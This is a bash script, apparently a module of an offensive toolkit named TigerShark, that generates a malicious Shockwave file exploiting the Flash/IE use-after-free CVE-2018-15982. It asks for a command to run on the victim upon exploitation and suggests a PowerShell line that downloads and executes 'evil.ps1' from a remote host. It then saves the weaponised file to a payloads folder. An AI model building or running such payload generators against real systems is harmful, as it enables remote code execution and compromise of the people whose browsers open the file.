#!/bin/bash
ORNG='\033[0;33m'
NC='\033[0m'
W='\033[1;37m'
LP='\033[1;35m'
YLW='\033[1;33m'
RED='\033[0;31m'
LBBLUE='\e[104m'

# Payload Folder Check
if [[ ! -d '/opt/TigerShark/Payloads/Shocks' ]]; then
	mkdir /opt/TigerShark/Payloads/Shocks
fi

# Runtime
echo -e "${ORNG}"
figlet -f mini "Adobe Shockwave UAF (CVE-2018-15982)"
echo -e "${RED}IE Use-After-Free Exploit${NC}"
cd tools/adobe-flash-cve2018-15982
echo -e "${W}Please enter the command that should be executed upon exploitation\n${RED}eg. ${YLW}powershell.exe IEX (iwr 'http://192.168.56.101/evil.ps1')${NC}"
read COM
echo -e "${W}Please enter the name for evil shockwave file${NC}"
read PYNM
python create_swf.py "${COM}" ${PYNM}
sleep 5
mv ${PYNM}.swf -t /opt/TigerShark/Payloads/Shocks
echo -e "${LP}Your payload has been saved to ${LBBLUE}/opt/TigerShark/Payloads/Shocks${LP} folder${NC}"
cd ../..
./tigershark